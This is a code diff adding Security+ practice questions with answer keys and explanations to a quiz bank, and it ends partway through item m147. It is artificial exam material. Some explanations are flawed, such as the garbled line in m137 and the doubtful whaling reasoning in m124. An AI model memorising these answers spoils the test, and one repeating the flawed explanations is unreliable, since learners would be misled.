@@ -994,6 +994,1507 @@ const MCQ_BANK = [
     opts:["Indemnification clause","Right to audit clause","Limitation of liability clause","Force majeure clause"], correct:1,
     exp:"A right to audit clause gives the organisation the contractual right to audit the vendor's security controls, review evidence, and conduct assessments. Without this clause, the organisation must rely on the vendor's self-reporting — which may not provide sufficient assurance.",
     wrongFeedback:{ 0:"An indemnification clause determines who compensates whom for damages — it does not grant audit rights.", 2:"A limitation of liability clause caps the vendor's financial exposure — it does not allow verification of security controls.", 3:"A force majeure clause addresses unforeseeable events (natural disasters) that prevent contract fulfilment — unrelated to security verification." }},
+  // ── Imported MCQs m101-m200 from secplus-mcq-bank.html ──
+  {
+      "id": "m101",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Security Controls",
+      "q": "Which of the following BEST describes a deterrent security control?",
+      "opts": [
+        "A firewall that blocks unauthorised traffic",
+        "A security camera sign posted at a facility entrance",
+        "Antivirus software that quarantines malware",
+        "An access control list that restricts file permissions"
+      ],
+      "correct": 1,
+      "exp": "A deterrent control discourages potential attackers without physically preventing an action. A sign warning of camera surveillance deters behaviour rather than technically blocking it. A firewall and ACL are preventive controls; antivirus is a corrective/detective control."
+    },
+    {
+      "id": "m102",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Security Controls",
+      "q": "An organisation deploys a CCTV system that records all activity in a server room. Which control category does this PRIMARILY represent?",
+      "opts": [
+        "Preventive",
+        "Detective",
+        "Corrective",
+        "Compensating"
+      ],
+      "correct": 1,
+      "exp": "CCTV is primarily a detective control — it records events so they can be identified and investigated after they occur. It does not prevent access or correct a problem; it detects what happened. A mantrap would be preventive; a compensating control substitutes for another control that cannot be implemented."
+    },
+    {
+      "id": "m103",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Cryptography Concepts",
+      "q": "Which property of cryptography ensures that data has not been altered in transit?",
+      "opts": [
+        "Confidentiality",
+        "Non-repudiation",
+        "Integrity",
+        "Availability"
+      ],
+      "correct": 2,
+      "exp": "Integrity guarantees that data remains unmodified. Hash functions (SHA-256, SHA-3) detect any change to data. Confidentiality prevents unauthorised disclosure; non-repudiation prevents denial of an action; availability ensures systems are accessible."
+    },
+    {
+      "id": "m104",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Cryptography Concepts",
+      "q": "A developer needs to store user passwords so that they cannot be reversed to plaintext, and so that two users with the same password produce different stored values. Which approach is MOST appropriate?",
+      "opts": [
+        "Encrypt passwords with AES-256 using a single application key",
+        "Hash passwords with SHA-256",
+        "Hash passwords with bcrypt and a unique per-user salt",
+        "Encode passwords in Base64"
+      ],
+      "correct": 2,
+      "exp": "bcrypt with a per-user salt is designed for password storage. The salt ensures two identical passwords produce different hashes (preventing rainbow-table attacks). bcrypt's work factor makes brute-forcing computationally expensive. SHA-256 alone is too fast. AES-256 is reversible (encryption, not hashing). Base64 is encoding, not security."
+    },
+    {
+      "id": "m105",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Cryptography Concepts",
+      "q": "An organisation wants to use asymmetric cryptography to allow anyone to send it encrypted messages, while ensuring only the organisation can decrypt them. Which key should be distributed publicly?",
+      "opts": [
+        "Symmetric session key",
+        "Private key",
+        "Public key",
+        "Pre-shared key"
+      ],
+      "correct": 2,
+      "exp": "In asymmetric cryptography, the public key is shared openly and used by senders to encrypt messages. Only the corresponding private key — held exclusively by the organisation — can decrypt them. Distributing the private key would destroy confidentiality. Symmetric and pre-shared keys require secure prior exchange."
+    },
+    {
+      "id": "m106",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "Cryptography Concepts",
+      "q": "An organisation currently uses TLS 1.2 with RSA key exchange for its web services. A security architect recommends migrating to TLS 1.3. Which TLS 1.3 feature provides the MOST significant security improvement over TLS 1.2 with RSA key exchange?",
+      "opts": [
+        "Support for SHA-384 hash algorithms",
+        "Mandatory use of ephemeral key exchange providing Perfect Forward Secrecy",
+        "Removal of the certificate handshake",
+        "Enforcement of 4096-bit RSA keys"
+      ],
+      "correct": 1,
+      "exp": "TLS 1.3 mandates ephemeral Diffie-Hellman key exchange (ECDHE), which provides Perfect Forward Secrecy (PFS). With TLS 1.2 RSA key exchange, compromise of the server's private key exposes all past sessions. With PFS, each session uses a unique ephemeral key — past sessions remain secure even if the private key is later compromised. TLS 1.3 also removed static RSA and weak ciphers entirely."
+    },
+    {
+      "id": "m107",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Authentication & Authorisation",
+      "q": "A user logs into a system by swiping a badge AND entering a PIN. Which type of authentication is being used?",
+      "opts": [
+        "Single-factor authentication",
+        "Two-factor authentication",
+        "Biometric authentication",
+        "Federated authentication"
+      ],
+      "correct": 1,
+      "exp": "Two-factor authentication (2FA) combines two different factor categories. A badge is \"something you have\" and a PIN is \"something you know.\" Using two factors from different categories is MFA/2FA. Single-factor uses only one; biometric uses physical characteristics; federated uses a shared identity across domains."
+    },
+    {
+      "id": "m108",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Authentication & Authorisation",
+      "q": "A large organisation uses a system where users authenticate once and can then access multiple applications without re-entering credentials. Which technology BEST describes this?",
+      "opts": [
+        "RADIUS",
+        "Multi-factor authentication",
+        "Single Sign-On (SSO)",
+        "Role-Based Access Control (RBAC)"
+      ],
+      "correct": 2,
+      "exp": "Single Sign-On (SSO) allows users to authenticate once and access multiple systems using that single authentication. RADIUS is an AAA protocol for network access. MFA adds authentication factors but does not address cross-application access. RBAC defines what authenticated users can do, not how they authenticate."
+    },
+    {
+      "id": "m109",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "Authentication & Authorisation",
+      "q": "Which access control model is used in military and government systems where the operating system enforces access based on data classification labels and user clearance levels — and users cannot change these permissions?",
+      "opts": [
+        "Discretionary Access Control (DAC)",
+        "Mandatory Access Control (MAC)",
+        "Role-Based Access Control (RBAC)",
+        "Attribute-Based Access Control (ABAC)"
+      ],
+      "correct": 1,
+      "exp": "Mandatory Access Control (MAC) is enforced by the operating system based on classification labels (e.g., Top Secret, Secret) and user clearances. Users cannot modify permissions — the OS controls access. DAC lets resource owners set permissions. RBAC assigns permissions to roles. ABAC uses policies based on multiple attributes."
+    },
+    {
+      "id": "m110",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "PKI & Certificates",
+      "q": "A website's TLS certificate was compromised before its scheduled expiry. Which PKI mechanism allows clients to check in real time whether a specific certificate has been revoked?",
+      "opts": [
+        "Certificate Revocation List (CRL)",
+        "Online Certificate Status Protocol (OCSP)",
+        "Certificate Signing Request (CSR)",
+        "DNS CAA record"
+      ],
+      "correct": 1,
+      "exp": "OCSP (Online Certificate Status Protocol) provides real-time, per-certificate revocation status by querying an OCSP responder. CRLs are periodically published lists — they are not real-time and can be large. A CSR is used to request a certificate. DNS CAA records specify which CAs may issue certificates for a domain."
+    },
+    {
+      "id": "m111",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "PKI & Certificates",
+      "q": "An organisation generates a key pair on its web server and sends the public key along with identity information to a Certificate Authority. What document is created for this submission?",
+      "opts": [
+        "Certificate Revocation List (CRL)",
+        "Digital signature",
+        "Certificate Signing Request (CSR)",
+        "Root certificate"
+      ],
+      "correct": 2,
+      "exp": "A Certificate Signing Request (CSR) contains the applicant's public key and identity information (Common Name, organisation, etc.) and is submitted to a CA for signing. The private key is never transmitted. The CA validates the information and returns a signed certificate. A CRL lists revoked certificates; a root certificate is self-signed by a root CA."
+    },
+    {
+      "id": "m112",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "PKI & Certificates",
+      "q": "An organisation wants to prevent any Certificate Authority — including rogue or compromised ones — from issuing fraudulent TLS certificates for its domain without its knowledge. Which DNS-based mechanism provides this protection?",
+      "opts": [
+        "DNSSEC",
+        "DNS CAA (Certification Authority Authorization) records",
+        "OCSP Stapling",
+        "Certificate Transparency (CT) logs"
+      ],
+      "correct": 1,
+      "exp": "DNS CAA records specify which CAs are authorised to issue certificates for a domain. A compliant CA checks CAA records before issuance. This directly restricts which CAs can issue, reducing mis-issuance risk. DNSSEC secures DNS responses. OCSP Stapling improves revocation performance. CT logs provide post-issuance transparency but don't prevent issuance."
+    },
+    {
+      "id": "m113",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Security Principles",
+      "q": "The principle of least privilege states that a user or system should be given:",
+      "opts": [
+        "Full administrative rights to ensure they can complete all tasks",
+        "Access only to the resources required to perform their specific job function",
+        "Access equivalent to the most senior person in their department",
+        "No access until explicitly requested through a formal process"
+      ],
+      "correct": 1,
+      "exp": "Least privilege limits access rights to only what is necessary for a user's specific role. This minimises the blast radius if credentials are compromised. Granting excessive rights (admin, department-level) violates least privilege. The principle is not about process for requesting access — it is about scope of access granted."
+    },
+    {
+      "id": "m114",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Security Principles",
+      "q": "A financial institution requires that no single employee can both approve a payment request and also execute that payment transfer. Which security principle does this enforce?",
+      "opts": [
+        "Least privilege",
+        "Defence in depth",
+        "Separation of duties",
+        "Job rotation"
+      ],
+      "correct": 2,
+      "exp": "Separation of duties requires that critical tasks be split among multiple individuals so no single person can commit fraud or error unilaterally. Least privilege limits access scope. Defence in depth layers controls. Job rotation detects fraud through exposure — it is complementary but different."
+    },
+    {
+      "id": "m115",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "Security Principles",
+      "q": "An organisation implements multiple overlapping security controls across physical, technical, and administrative layers so that failure of a single control does not result in a complete security breach. Which strategy is being employed?",
+      "opts": [
+        "Zero Trust Architecture",
+        "Defence in depth",
+        "Security through obscurity",
+        "Risk transference"
+      ],
+      "correct": 1,
+      "exp": "Defence in depth (also called layered security) places multiple overlapping controls across different domains so that an attacker must defeat multiple independent barriers. Zero Trust is an architecture philosophy (never trust, always verify). Security through obscurity relies on concealment alone. Risk transference shifts risk to a third party."
+    },
+    {
+      "id": "m116",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Cryptography Concepts",
+      "q": "Which hashing algorithm is currently considered cryptographically broken and should NOT be used for security purposes?",
+      "opts": [
+        "SHA-256",
+        "SHA-3",
+        "MD5",
+        "BLAKE2"
+      ],
+      "correct": 2,
+      "exp": "MD5 is cryptographically broken — practical collision attacks have been demonstrated (two different inputs can produce the same hash). It should not be used for digital signatures, certificate fingerprints, or password hashing. SHA-256, SHA-3, and BLAKE2 are considered secure for current use."
+    },
+    {
+      "id": "m117",
+      "ch": "1",
+      "difficulty": "easy",
+      "topic": "Authentication & Authorisation",
+      "q": "Which of the following is an example of a \"something you are\" authentication factor?",
+      "opts": [
+        "A hardware security token",
+        "A one-time passcode sent via SMS",
+        "A fingerprint scan",
+        "A secret passphrase"
+      ],
+      "correct": 2,
+      "exp": "\"Something you are\" refers to inherence factors — biometrics including fingerprints, retinal scans, facial recognition, and voice recognition. A hardware token is \"something you have.\" An OTP via SMS is \"something you have\" (the phone). A passphrase is \"something you know.\""
+    },
+    {
+      "id": "m118",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "Cryptography Concepts",
+      "q": "An organisation encrypts sensitive database backups using symmetric encryption. They want to ensure the encryption keys are protected from compromise of the application server. Which solution BEST protects the key material?",
+      "opts": [
+        "Store keys in a configuration file encrypted with the same key",
+        "Use a Hardware Security Module (HSM) to generate and store keys",
+        "Encode keys in Base64 and store in the database",
+        "Rotate keys every 90 days"
+      ],
+      "correct": 1,
+      "exp": "A Hardware Security Module (HSM) is a tamper-resistant physical device that generates, stores, and manages cryptographic keys. Keys never leave the HSM in plaintext — operations are performed inside it. Storing keys in config files (even encrypted) creates circular key protection problems. Base64 is not encryption. Rotation improves hygiene but does not protect key storage."
+    },
+    {
+      "id": "m119",
+      "ch": "1",
+      "difficulty": "medium",
+      "topic": "Security Principles",
+      "q": "An employee who is about to leave the company still has full access to critical systems until their last day. Which IAM process failure does this represent?",
+      "opts": [
+        "Privilege creep",
+        "Inadequate deprovisioning",
+        "Separation of duties violation",
+        "Excessive onboarding"
+      ],
+      "correct": 1,
+      "exp": "Inadequate deprovisioning means access rights are not revoked promptly when an employee leaves or changes roles. This is a major insider threat risk. Privilege creep is the accumulation of excessive permissions over time. Separation of duties relates to task division. Onboarding processes grant initial access."
+    },
+    {
+      "id": "m120",
+      "ch": "1",
+      "difficulty": "hard",
+      "topic": "Authentication & Authorisation",
+      "q": "Which protocol provides mutual authentication, uses time-limited tickets to prevent replay attacks, and never transmits passwords across the network?",
+      "opts": [
+        "NTLM",
+        "RADIUS",
+        "Kerberos",
+        "LDAP"
+      ],
+      "correct": 2,
+      "exp": "Kerberos provides mutual authentication (both client and server prove identity), uses time-limited tickets (Ticket Granting Tickets expire to prevent replay), and authenticates using cryptographic proof — passwords are only used locally to decrypt the initial TGT. NTLM is challenge-response but lacks mutual authentication. RADIUS is an AAA protocol. LDAP is a directory access protocol."
+    },
+    {
+      "id": "m121",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Threat Actors & Motivations",
+      "q": "Which threat actor type is characterised by using publicly available hacking tools with limited technical skill, primarily motivated by curiosity or notoriety?",
+      "opts": [
+        "Nation-state actor",
+        "Hacktivist",
+        "Script kiddie",
+        "Insider threat"
+      ],
+      "correct": 2,
+      "exp": "A script kiddie lacks deep technical knowledge and uses pre-written tools and scripts created by others. They are typically motivated by curiosity, bragging rights, or simple disruption rather than financial gain or ideology. Nation-state actors are sophisticated and well-resourced. Hacktivists are ideologically motivated. Insiders have authorised access."
+    },
+    {
+      "id": "m122",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Threat Actors & Motivations",
+      "q": "An organisation discovers that an attacker maintained undetected access to its network for 14 months, slowly exfiltrating intellectual property. Which threat category BEST describes this?",
+      "opts": [
+        "Opportunistic cybercrime",
+        "Advanced Persistent Threat (APT)",
+        "Distributed Denial of Service (DDoS)",
+        "Script kiddie attack"
+      ],
+      "correct": 1,
+      "exp": "An Advanced Persistent Threat (APT) is characterised by: Advanced tactics and custom tooling, Persistent long-term presence (months to years), and strategic Threat objectives (espionage, IP theft). The 14-month dwell time and targeted exfiltration are hallmarks of APT activity. Opportunistic crime is short-lived. DDoS disrupts availability. Script kiddies lack the sophistication for long-term stealthy operations."
+    },
+    {
+      "id": "m123",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Common Threats",
+      "q": "An employee receives an email appearing to come from their bank, asking them to click a link and verify their account credentials. This is an example of:",
+      "opts": [
+        "Vishing",
+        "Spear phishing",
+        "Smishing",
+        "Generic phishing"
+      ],
+      "correct": 3,
+      "exp": "Phishing (generic) is a mass-sent fraudulent email impersonating a trusted entity to steal credentials. It is not targeted at a specific individual (that would be spear phishing) nor delivered by voice call (vishing) or SMS (smishing). The generic bank impersonation targeting any recipient is classic phishing."
+    },
+    {
+      "id": "m124",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Common Threats",
+      "q": "An attacker researches a specific executive on LinkedIn, learns the names of their colleagues and current projects, and then sends a highly personalised fraudulent email appearing to come from the CFO requesting a wire transfer. This is BEST classified as:",
+      "opts": [
+        "Whaling",
+        "Generic phishing",
+        "Business Email Compromise (BEC) / Spear phishing",
+        "Vishing"
+      ],
+      "correct": 2,
+      "exp": "This is Business Email Compromise (BEC), a targeted form of spear phishing. The attacker uses OSINT (LinkedIn research) to craft a convincing, personalised attack against a specific individual. Whaling specifically targets senior executives as the victim (the executive here is the attacker's research subject, not the target). Generic phishing is mass, untargeted."
+    },
+    {
+      "id": "m125",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Common Threats",
+      "q": "Which malware type does NOT require a host file to spread and can independently propagate across networks by exploiting vulnerabilities?",
+      "opts": [
+        "Virus",
+        "Trojan",
+        "Worm",
+        "Ransomware"
+      ],
+      "correct": 2,
+      "exp": "A worm is self-replicating and spreads autonomously across networks without requiring a host file or user action (unlike a virus which needs a host program). Trojans masquerade as legitimate software. Ransomware encrypts files for extortion. A virus requires attachment to an existing file."
+    },
+    {
+      "id": "m126",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Common Threats",
+      "q": "A user's files are encrypted by malware, and a message demands cryptocurrency payment in exchange for the decryption key. Which malware category is this?",
+      "opts": [
+        "Spyware",
+        "Rootkit",
+        "Ransomware",
+        "Adware"
+      ],
+      "correct": 2,
+      "exp": "Ransomware encrypts victim data and demands payment (usually cryptocurrency) for the decryption key. Spyware silently collects information. Rootkits provide hidden persistent access. Adware displays unwanted advertisements."
+    },
+    {
+      "id": "m127",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Common Threats",
+      "q": "An attacker modifies a legitimate software update distributed through a vendor's official update channel, inserting malicious code that is then installed by thousands of customers. Which attack vector does this represent?",
+      "opts": [
+        "Watering hole attack",
+        "Supply chain attack",
+        "Zero-day exploit",
+        "Credential stuffing"
+      ],
+      "correct": 1,
+      "exp": "A supply chain attack compromises software, hardware, or services within the supply chain rather than attacking targets directly. Inserting malicious code into a legitimate vendor update (as in the SolarWinds attack) is a prime example. A watering hole compromises websites frequented by targets. A zero-day exploits an unpatched vulnerability. Credential stuffing uses breached credentials."
+    },
+    {
+      "id": "m128",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Vulnerability Types",
+      "q": "A CVSS 3.1 Base Score of 9.1 is assigned to a vulnerability. How should this be classified, and what does it indicate about remediation priority?",
+      "opts": [
+        "High severity — remediate within 30 days",
+        "Critical severity — remediate immediately, highest priority",
+        "Medium severity — remediate within 90 days",
+        "Low severity — remediate during next maintenance window"
+      ],
+      "correct": 1,
+      "exp": "CVSS 3.1 scoring: 9.0–10.0 = Critical. A score of 9.1 indicates a critical vulnerability requiring immediate, highest-priority remediation. High is 7.0–8.9; Medium is 4.0–6.9; Low is 0.1–3.9. Critical vulnerabilities often allow unauthenticated remote code execution or similar catastrophic impact."
+    },
+    {
+      "id": "m129",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Vulnerability Types",
+      "q": "Which vulnerability type occurs when an application passes unsanitised user input directly to a database query, allowing an attacker to manipulate the query logic?",
+      "opts": [
+        "Cross-Site Scripting (XSS)",
+        "Buffer overflow",
+        "SQL Injection",
+        "Directory traversal"
+      ],
+      "correct": 2,
+      "exp": "SQL Injection occurs when user-supplied input is incorporated into database queries without proper sanitisation or parameterisation, allowing attackers to alter query logic, extract data, or bypass authentication. XSS injects client-side scripts. Buffer overflow corrupts memory. Directory traversal accesses files outside intended paths."
+    },
+    {
+      "id": "m130",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Vulnerability Types",
+      "q": "A security researcher discovers an unpatched vulnerability in a widely deployed VPN product for which no public exploit yet exists. The researcher privately notifies the vendor. Which term describes this vulnerability before the vendor releases a patch?",
+      "opts": [
+        "Legacy vulnerability",
+        "Known vulnerability",
+        "Zero-day vulnerability",
+        "Residual vulnerability"
+      ],
+      "correct": 2,
+      "exp": "A zero-day vulnerability is one that is unknown to the software vendor or for which no patch exists. \"Zero-day\" refers to the zero days the vendor has had to address it. Once the vendor is notified and issues a patch, it becomes a \"known vulnerability.\" Legacy vulnerabilities affect end-of-life systems. Residual risk is what remains after controls are applied."
+    },
+    {
+      "id": "m131",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Indicators of Compromise",
+      "q": "A security analyst notices that a workstation is making outbound connections to the same external IP address every 5 minutes, regardless of user activity. This pattern MOST likely indicates:",
+      "opts": [
+        "Normal Windows Update behaviour",
+        "Command and Control (C2) beaconing by malware",
+        "An authorised monitoring agent",
+        "DNS poisoning"
+      ],
+      "correct": 1,
+      "exp": "Regular, automated outbound connections at fixed intervals — especially to an unknown external IP regardless of user activity — are a classic indicator of Command and Control (C2) beaconing. Malware checks in with its C2 server at regular intervals to receive instructions. Windows Update does not contact single IPs at fixed intervals. Legitimate agents have known, documented destinations."
+    },
+    {
+      "id": "m132",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Indicators of Compromise",
+      "q": "An EDR platform flags a process named \"explorer.exe\" running from C:\\Users\\Public\\explorer.exe. What type of attack technique does this suggest?",
+      "opts": [
+        "Privilege escalation",
+        "Process masquerading (T1036 — Masquerading)",
+        "DLL hijacking",
+        "Credential dumping"
+      ],
+      "correct": 1,
+      "exp": "Running a malicious binary with the same name as a legitimate Windows process (explorer.exe) from an unusual path (C:\\Users\\Public\\ instead of C:\\Windows\\) is process masquerading (MITRE ATT&CK T1036). Legitimate Windows processes have fixed, known locations. The non-standard path is the key indicator. This is a defence evasion technique."
+    },
+    {
+      "id": "m133",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Mitigation Techniques",
+      "q": "Which mitigation technique involves dividing a network into smaller segments to limit lateral movement in the event of a breach?",
+      "opts": [
+        "Network Address Translation (NAT)",
+        "Network segmentation",
+        "Quality of Service (QoS)",
+        "Bandwidth throttling"
+      ],
+      "correct": 1,
+      "exp": "Network segmentation divides a network into isolated segments (VLANs, subnets, zones) with controlled traffic flow between them. If one segment is compromised, the attacker cannot freely move laterally to other segments. NAT translates IP addresses. QoS prioritises traffic. Bandwidth throttling limits data rates."
+    },
+    {
+      "id": "m134",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Mitigation Techniques",
+      "q": "A company patches all known vulnerabilities on its servers immediately upon vendor release. However, an attacker exploits a vulnerability that was used in an attack before the patch existed. Which gap does this represent?",
+      "opts": [
+        "The patch management process failed",
+        "The vulnerability was a zero-day — patching cannot address vulnerabilities before patches exist",
+        "The company did not use antivirus software",
+        "The company lacked a firewall"
+      ],
+      "correct": 1,
+      "exp": "A zero-day vulnerability, by definition, is exploited before a patch exists. Even a perfect, immediate patching programme cannot protect against a vulnerability for which no patch has been released. This gap is addressed through compensating controls (WAF virtual patching, network segmentation, anomaly detection) until the vendor releases a fix."
+    },
+    {
+      "id": "m135",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Vulnerability Types",
+      "q": "A web application allows users to upload profile images. An attacker uploads a PHP script with a .jpg extension. The server stores and executes it, granting command execution. Which TWO vulnerabilities are chained here?",
+      "opts": [
+        "Unrestricted file upload + insufficient file type validation",
+        "SQL injection + XSS",
+        "CSRF + session hijacking",
+        "Directory traversal + privilege escalation"
+      ],
+      "correct": 0,
+      "exp": "This attack chains unrestricted file upload (server accepts any file type) with insufficient file type validation (only checking extension, not MIME type or file content). The server executes uploaded files, enabling Remote Code Execution. Remediation: validate MIME type server-side, store uploads outside web root, strip execute permissions, use a CDN to serve uploads."
+    },
+    {
+      "id": "m136",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Common Threats",
+      "q": "An attacker intercepts the communication between a client and web server, reads and potentially modifies the data, and forwards it to both parties without either knowing. This is BEST described as:",
+      "opts": [
+        "Replay attack",
+        "Man-in-the-Middle (MitM) attack",
+        "Denial-of-Service attack",
+        "Session fixation"
+      ],
+      "correct": 1,
+      "exp": "A Man-in-the-Middle (MitM) attack positions the attacker between two communicating parties, intercepting and potentially altering communications without their knowledge. A replay attack reuses captured valid transmissions. DoS disrupts availability. Session fixation forces a user to use a known session ID."
+    },
+    {
+      "id": "m137",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Common Threats",
+      "q": "A threat intelligence report indicates attackers are embedding malicious payloads in PNG image files by storing data in unused header bytes, then hosting these images on legitimate cloud storage. Which technique is being used?",
+      "opts": [
+        "Stenography",
+        "Steganography",
+        "Polymorphic code",
+        "Living off the land"
+      ],
+      "correct": 1,
+      "exp": "Steganography conceals data within another file (image, audio, video) without visibly altering it. Attackers use it to hide malware or exfiltrated data inside innocent-looking carrier files, evading content inspection. Stenography is shorthand for stenography (court reporting). Polymorphic code changes its signature to evade AV. Living off the land uses legitimate OS tools maliciously."
+    },
+    {
+      "id": "m138",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Mitigation Techniques",
+      "q": "Which control is MOST effective at preventing an attacker from escalating from a compromised DMZ web server to the internal database server?",
+      "opts": [
+        "Antivirus on the database server",
+        "Firewall rule denying all DMZ-to-internal-DB traffic except required application ports",
+        "Strong passwords on the database",
+        "Logging on the web server"
+      ],
+      "correct": 1,
+      "exp": "A firewall rule denying DMZ-to-internal traffic except for the specific application port required is the most direct and effective technical control. Even if the web server is compromised, the attacker cannot reach the DB server through a correctly configured firewall. AV, strong passwords, and logging are important but do not block network access."
+    },
+    {
+      "id": "m139",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Threat Actors & Motivations",
+      "q": "Which type of threat actor is MOST commonly motivated by financial gain and typically conducts ransomware campaigns and payment card theft?",
+      "opts": [
+        "Nation-state actor",
+        "Hacktivist",
+        "Organised cybercriminal group",
+        "Insider threat"
+      ],
+      "correct": 2,
+      "exp": "Organised cybercriminal groups are primarily motivated by financial gain. Ransomware operations, payment card skimming, banking trojans, and fraud are their primary activities. Nation-state actors are motivated by espionage and geopolitical goals. Hacktivists are ideologically motivated. Insiders may be motivated by grievance, financial pressure, or coercion."
+    },
+    {
+      "id": "m140",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Indicators of Compromise",
+      "q": "A threat hunter queries DNS logs and finds that a workstation is making thousands of TXT record queries to randomly generated subdomains of a single domain (e.g., x7k2.data.attacker.com, p9n1.data.attacker.com). What is the MOST likely explanation?",
+      "opts": [
+        "The workstation is running a legitimate DNS load test",
+        "DNS tunneling — data is being encoded in DNS queries for C2 or exfiltration",
+        "The DNS server is misconfigured",
+        "DNS cache poisoning is in progress"
+      ],
+      "correct": 1,
+      "exp": "DNS tunneling encodes data (C2 commands, exfiltrated data) inside DNS query/response data, exploiting the fact that DNS is rarely blocked at firewalls. Randomly generated subdomains are used to avoid caching and carry encoded payloads. The volume and pattern of TXT record queries to a single domain is a strong indicator. Mitigations: DNS inspection, RPZ (Response Policy Zones), anomaly detection."
+    },
+    {
+      "id": "m141",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Vulnerability Types",
+      "q": "An application error message displays the database server hostname, software version, and stack trace when a user submits invalid input. Which vulnerability type does this represent?",
+      "opts": [
+        "SQL injection",
+        "Improper error handling / information disclosure",
+        "Insecure direct object reference",
+        "Cross-site request forgery"
+      ],
+      "correct": 1,
+      "exp": "Improper error handling (information disclosure) occurs when applications reveal internal details (stack traces, database names, software versions) in error messages. Attackers use this information to tailor further attacks. Remediation: implement generic error messages for users while logging detailed errors server-side. This is listed in OWASP Top 10 under Security Misconfiguration."
+    },
+    {
+      "id": "m142",
+      "ch": "2",
+      "difficulty": "medium",
+      "topic": "Mitigation Techniques",
+      "q": "An organisation wants to harden its endpoints against malware that attempts to run unsigned scripts. Which Windows security feature directly addresses this?",
+      "opts": [
+        "Windows Firewall",
+        "PowerShell Execution Policy set to AllSigned or RemoteSigned",
+        "BitLocker encryption",
+        "Windows Defender Antivirus"
+      ],
+      "correct": 1,
+      "exp": "PowerShell Execution Policy set to AllSigned requires all scripts to be digitally signed by a trusted publisher, preventing unsigned malicious scripts from running. RemoteSigned requires remote scripts to be signed. Windows Firewall controls network traffic. BitLocker encrypts disks. Antivirus detects known signatures but may not catch novel unsigned scripts."
+    },
+    {
+      "id": "m143",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Common Threats",
+      "q": "An attacker sends 50,000 UDP packets to random ports on a target server, each with a spoofed source IP address pointing to a victim. The target's responses flood the victim. Which attack type is this?",
+      "opts": [
+        "SYN flood",
+        "UDP amplification / reflection attack",
+        "Smurf attack",
+        "Ping of Death"
+      ],
+      "correct": 1,
+      "exp": "A UDP amplification/reflection attack spoofs the victim's IP address in requests to open servers (DNS, NTP, SSDP). The servers send their (often much larger) responses to the victim, amplifying the attack volume. A SYN flood exhausts TCP connection tables. A Smurf attack uses ICMP echo requests to broadcast addresses. Ping of Death sends oversized ICMP packets."
+    },
+    {
+      "id": "m144",
+      "ch": "2",
+      "difficulty": "easy",
+      "topic": "Mitigation Techniques",
+      "q": "Which email authentication protocol allows domain owners to specify which IP addresses and mail servers are authorised to send email on behalf of their domain?",
+      "opts": [
+        "DKIM",
+        "DMARC",
+        "SPF",
+        "S/MIME"
+      ],
+      "correct": 2,
+      "exp": "SPF (Sender Policy Framework) is a DNS record that lists authorised mail servers for a domain. Receiving servers check SPF to verify the sending server is authorised. DKIM adds a cryptographic signature to email headers. DMARC uses SPF and DKIM to specify enforcement policy. S/MIME provides end-to-end email encryption and signing."
+    },
+    {
+      "id": "m145",
+      "ch": "2",
+      "difficulty": "hard",
+      "topic": "Vulnerability Types",
+      "q": "A penetration tester discovers that an internal web application uses sequential numeric IDs in URLs to access user records (e.g., /account?id=1042). By incrementing the ID, they can access other users' records. Which vulnerability is this?",
+      "opts": [
+        "SQL Injection",
+        "Broken Authentication",
+        "Insecure Direct Object Reference (IDOR)",
+        "Server-Side Request Forgery (SSRF)"
+      ],
+      "correct": 2,
+      "exp": "Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input to directly access objects (records, files) without verifying the user's authorisation to access that specific object. The fix is server-side authorisation checks on every object access request, not sequential IDs. This is in the OWASP Top 10 under Broken Access Control."
+    },
+    {
+      "id": "m146",
+      "ch": "3",
+      "difficulty": "easy",
+      "topic": "Network Architecture",
+      "q": "A DMZ (Demilitarised Zone) is BEST described as:",
+      "opts": [
+        "A network segment with no internet access used for classified data",
+        "A perimeter network segment hosting public-facing services, sitting between the internet and the internal network",
+        "A wireless network reserved for guest users",
+        "A VLAN used exclusively for management traffic"
+      ],
+      "correct": 1,
+      "exp": "A DMZ is a network zone that sits between an external untrusted network (internet) and the internal trusted network. It hosts public-facing services (web servers, mail servers, DNS) that must be accessible from the internet while protecting the internal network. If a DMZ server is compromised, the internal network remains protected by the inner firewall."
+    },
+    {
+      "id": "m147",
+      "ch": "3",
+      "difficulty": "medium",
+      "topic": "Network Architecture",
